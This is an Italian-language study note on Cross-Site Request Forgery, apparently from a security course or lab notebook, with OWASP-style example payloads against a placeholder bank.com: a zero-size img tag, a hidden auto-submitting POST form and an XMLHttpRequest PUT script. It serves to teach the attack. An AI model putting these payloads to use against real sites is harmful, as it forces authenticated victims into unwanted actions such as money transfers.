## CSRF

- https://www.owasp.org/index.php/Cross-Site_Request_Forgery
- http://www.cgisecurity.com/csrf-faq.html
- https://en.wikipedia.org/wiki/Cross-site_request_forgery

Cross-Site Request Forgery forza l'utente a fare una richiesta malevola a un sito su cui è autenticato.
L'attacco ha come obiettivo le richieste che cambiano lo stato interno del server, non il furto di dati; infatti l'attaccante non ha modo di vedere la risposta alla richiesta malevola.
Si ha una vulnerabilità "stored CSRF" quando l'attaccante è in grado di rendere persistente l'attacco direttamente sul sito vulnerabile.
A tale scopo si memorizza un tag IMG o IFRAME in un campo che accetta HTML o si realizza un più complesso attacco di XSS.

L'attaccante ha l'obiettivo di far cliccare alla vittima il tag a o ad aprire l'email col tag img. Nell'esempio l'immagine non viene visualizzata in quanto ha altezza e larghezza pari a `0`.

Scenario GET:

- tag a: `<a href="http://bank.com/transfer.do?acct=MARIA&amount=100000">View my Pictures!</a>`

- tag img: `<img src="http://bank.com/transfer.do?acct=MARIA&amount=100000" width="0" height="0" border="0">`

Scenario POST:

Richiesta originale:

```
POST http://bank.com/transfer.do HTTP/1.1

acct=BOB&amount=100
```

Richiesta malevola:

- con interazione della vittima

```
<form action="<nowiki>http://bank.com/transfer.do</nowiki>" method="POST">
<input type="hidden" name="acct" value="MARIA"/>
<input type="hidden" name="amount" value="100000"/>
<input type="submit" value="View my pictures"/>
</form>
```

- senza interazione della vittima

```
<body onload="document.forms[0].submit()">

<form ...>
```

Scenario API

Richiesta originale:

```
PUT http://bank.com/transfer.do HTTP/1.1

{ "acct":"BOB", "amount":100 }
```

Richiesta malevola:

```
<script>
	function put() {
		var x = new XMLHttpRequest();
		x.open("PUT","http://bank.com/transfer.do",true);
		x.setRequestHeader("Content-Type", "application/json");
		x.send(JSON.stringify({"acct":"BOB", "amount":100}));
	}
</script>

<body onload="put()">
```

Nell'ultimo esempio, la richiesta **non** viene eseguita dai moderni browser grazie alla restrizione *same-origin policy*.
Questa protezione è abilitata di default, a meno che il server abiliti esplicitamente le richieste cross-origin da uno o più siti usando CORS con l'header `Access-Control-Allow-Origin: *`.

### CSRF - Medium

### CSRF - High

